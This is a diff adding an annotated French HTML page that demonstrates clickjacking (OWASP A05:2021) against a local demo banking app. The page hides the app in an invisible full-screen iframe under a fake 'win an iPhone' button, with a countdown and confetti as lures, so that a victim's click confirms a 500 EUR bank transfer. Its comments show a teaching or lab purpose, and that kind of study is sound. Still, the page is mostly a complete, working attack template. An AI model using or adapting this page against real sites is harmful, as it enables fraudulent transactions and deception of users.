@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<!--
+=================================================================
+  ATTAQUE.HTML - Page de demonstration Clickjacking
+  OWASP A05:2021 - Security Misconfiguration
+=================================================================
+  PRINCIPE DE L'ATTAQUE :
+  1. L'attaquant heberge cette page sur son propre site
+  2. Une iframe INVISIBLE charge l'application bancaire
+     (http://localhost:3000) en plein ecran, positionnee
+     exactement sous le faux bouton "Gagne un iPhone !"
+  3. L'utilisateur voit le site de l'attaquant et croit
+     cliquer sur le bouton attractif
+  4. En realite, son clic traverse l'iframe et declenche
+     "Confirmer le virement" sur l'app bancaire sous-jacente
+  5. Le virement est confirme A L'INSU de la victime
+
+  CE QUE VOIT L'UTILISATEUR : Un site attractif avec "Gagne un iPhone"
+  CE QUI SE PASSE REELLEMENT : Son clic confirme un virement bancaire
+=================================================================
+-->
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Felicitations ! Vous avez gagne !</title>
+  <style>
+    /* Reset */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* =========================================================
+       COUCHE 1 (EN DESSOUS) : L'application bancaire vulnerable
+       positionnee en plein ecran, INVISIBLE pour l'utilisateur
+       L'iframe est :
+         - opacity: 0   => completement invisible
+         - pointer-events: all => elle capte quand meme les clics
+         - position: fixed, top/left: 0, width/height: 100%
+         - z-index: 1   => derriere le contenu visible
+    ========================================================= */
+    #iframe-vicieuse {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      opacity: 0;           /* INVISIBLE pour l'utilisateur */
+      pointer-events: all;  /* Mais capte tous les clics ! */
+      z-index: 1;           /* Derriere le contenu visible */
+    }
+
+    /* =========================================================
+       COUCHE 2 (AU DESSUS) : Le contenu tricheur de l'attaquant
+       Visible par l'utilisateur, mais z-index plus haut
+       SAUF pour la zone du faux bouton qui doit "laisser passer"
+       les clics vers l'iframe en dessous
+    ========================================================= */
+    .contenu-attaquant {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      color: white;
+      padding: 40px;
+      max-width: 500px;
+    }
+
+    .emoji-trophy { font-size: 5rem; margin-bottom: 16px; display: block; }
+
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 12px;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+    }
+
+    .sous-titre {
+      font-size: 1.1rem;
+      margin-bottom: 8px;
+      opacity: 0.9;
+    }
+
+    .iphone-img {
+      font-size: 4rem;
+      margin: 20px 0;
+      display: block;
+    }
+
+    .compte-rebours {
+      font-size: 0.9rem;
+      background: rgba(255,255,255,0.2);
+      padding: 8px 16px;
+      border-radius: 20px;
+      margin-bottom: 24px;
+      display: inline-block;
+    }
+
+    /* =========================================================
+       LE FAUX BOUTON CLIQUABLE
+       Sa position est calculee pour se superposer EXACTEMENT
+       au bouton "Confirmer le virement" de l'iframe invisible.
+       pointer-events: none => les clics "traversent" vers l'iframe
+    ========================================================= */
+    .zone-clic {
+      position: relative;
+      display: inline-block;
+    }
+
+    .faux-bouton {
+      background: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
+      color: #333;
+      border: none;
+      padding: 18px 48px;
+      font-size: 1.3rem;
+      font-weight: bold;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+      transition: transform 0.2s;
+      pointer-events: none; /* Les clics traversent vers l'iframe ! */
+      position: relative;
+      z-index: 3;
+    }
+
+    /* Zone transparente qui "route" les clics vers l'iframe */
+    .zone-clic::after {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 2;
+      /* Commentaire : cette zone laisse passer les clics vers z-index: 1 */
+    }
+
+    .fleche { font-size: 1.2rem; margin-top: 12px; opacity: 0.7; }
+
+    .conditions {
+      margin-top: 24px;
+      font-size: 0.7rem;
+      opacity: 0.5;
+      max-width: 400px;
+    }
+
+    /* Confettis decoratifs */
+    .confetti {
+      position: fixed;
+      top: -10px;
+      border-radius: 50%;
+      animation: fall linear infinite;
+      z-index: 0;
+    }
+    @keyframes fall {
+      to { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- =======================================================
+       IFRAME INVISIBLE : Charge l'app bancaire vulnerable
+       L'utilisateur ne la voit pas (opacity: 0)
+       Mais ses clics sur le faux bouton atterrissent ici !
+  ======================================================= -->
+  <iframe
+    id="iframe-vicieuse"
+    src="http://localhost:3000"
+    title="hidden"
+    sandbox="allow-forms allow-scripts allow-same-origin">
+  </iframe>
+
+  <!-- =======================================================
+       CONTENU VISIBLE : Ce que voit l'utilisateur
+  ======================================================= -->
+  <div class="contenu-attaquant">
+    <span class="emoji-trophy">🏆</span>
+    <h1>Felicitations !</h1>
+    <p class="sous-titre">Vous etes le 1 000 000e visiteur du jour !</p>
+    <span class="iphone-img">📱</span>
+    <div class="compte-rebours">⏰ Offre expire dans : <strong id="timer">04:59</strong></div>
+
+    <!--
+      CE BOUTON EST LE LEURRE :
+      L'utilisateur croit cliquer sur "Gagne un iPhone !"
+      Mais pointer-events: none fait que le clic traverse
+      vers l'iframe invisible qui contient le bouton
+      "Confirmer le virement 500 EUR" de l'app bancaire.
+    -->
+    <div class="zone-clic">
+      <button class="faux-bouton">
+        🎁 &nbsp; Gagne un iPhone 16 Pro !
+      </button>
+    </div>
+
+    <p class="fleche">👆 Cliquez pour reclamer votre prize !</p>
+
+    <p class="conditions">
+      * Offre reservee aux 10 premiers participants. Aucun achat requis.
+        En cliquant, vous acceptez nos CGU. Livraison sous 7 jours ouvres.
+    </p>
+  </div>
+
+  <!-- Confettis decoratifs pour rendre la page credible -->
+  <script>
+    // Genere des confettis pour rendre la page attrayante
+    const colors = ['#f6d365', '#fda085', '#a8edea', '#fed6e3', '#ff9a9e'];
+    for (let i = 0; i < 20; i++) {
+      const c = document.createElement('div');
+      c.className = 'confetti';
+      c.style.cssText = [
+        'left:' + Math.random() * 100 + 'vw',
+        'width:' + (Math.random() * 12 + 6) + 'px',
+        'height:' + (Math.random() * 12 + 6) + 'px',
+        'background:' + colors[Math.floor(Math.random() * colors.length)],
+        'animation-duration:' + (Math.random() * 3 + 2) + 's',
+        'animation-delay:' + Math.random() * 3 + 's'
+      ].join(';');
+      document.body.appendChild(c);
+    }
+
+    // Compte a rebours pour creer de l'urgence (manipulation psychologique)
+    let seconds = 4 * 60 + 59;
+    setInterval(() => {
+      seconds--;
+      if (seconds < 0) seconds = 0;
+      const m = Math.floor(seconds / 60).toString().padStart(2, '0');
+      const s = (seconds % 60).toString().padStart(2, '0');
+      document.getElementById('timer').textContent = m + ':' + s;
+    }, 1000);
+  </script>
+
+</body>
+</html>
